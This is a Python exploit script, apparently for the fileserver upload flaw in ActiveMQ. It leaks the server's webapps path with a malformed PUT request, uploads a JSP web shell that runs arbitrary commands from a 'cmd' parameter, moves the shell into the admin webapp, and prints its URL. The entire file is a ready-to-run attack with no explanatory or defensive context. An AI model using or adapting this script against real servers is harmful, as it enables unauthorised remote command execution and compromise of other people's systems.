import requests
import re
import base64


def exploit(url, user, pw):
    r = requests.session()
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
        'Authorization': 'Basic {}'.format((base64.b64encode((user + ':' + pw).encode('ascii'))).decode('ascii'))
    }

    resp = r.put(url=url + 'fileserver/%80/%80', headers=headers)
    if str(resp.status_code) != '500':
        print("Could not upload shell. Exiting...")
        exit(0)
    path = re.search('.*\/(?!.*\/)|', resp.reason)
    path = path.group()
    path = path[:path.index('webapps') + len('webapps')]
    payload = """
        <%@ page import="java.util.*,java.io.*"%>
        <HTML>
        <BODY>
        <FORM METHOD="GET" NAME="myform" ACTION=""><INPUT TYPE="text" NAME="cmd"><INPUT TYPE="submit" VALUE="Send"></FORM>
        <pre>
        <%
            if (request.getParameter("cmd") != null) {
                out.println("Command: " + request.getParameter("cmd") + "<BR>");
                Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
                OutputStream os = p.getOutputStream();
                InputStream in = p.getInputStream();
                DataInputStream dis = new DataInputStream(in);
                String disr = dis.readLine();
                while ( disr != null ) {
                    out.println(disr); 
                    disr = dis.readLine(); 
                }
            }
        %>
        </pre>
        </BODY>
        </HTML>
        """

    headers = {
        'Destination': 'file://{}/admin/shell.jsp'.format(path),
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
        'Authorization': 'Basic {}'.format((base64.b64encode((user + ':' + pw).encode('ascii'))).decode('ascii'))
    }
    resp = r.put(url=url + 'fileserver/shell.jsp', headers=headers, data=payload)
    if str(resp.status_code) != '204':
        print("Could not upload shell. Exiting...")
        exit(0)
    resp = r.request(url=url + 'fileserver/shell.jsp', method='MOVE', headers=headers)
    if str(resp.status_code) != '204':
        print("Could not upload shell. Exiting...")
        exit(0)
    print("Shell:", url + 'admin/shell.jsp?cmd=whoami')


if __name__ == '__main__':
    url = input('Enter url (e.g http://127.0.0.1:8661/): ')
    user = input('Enter username: ')
    pw = input('Enter password: ')
    exploit(url, user, pw)
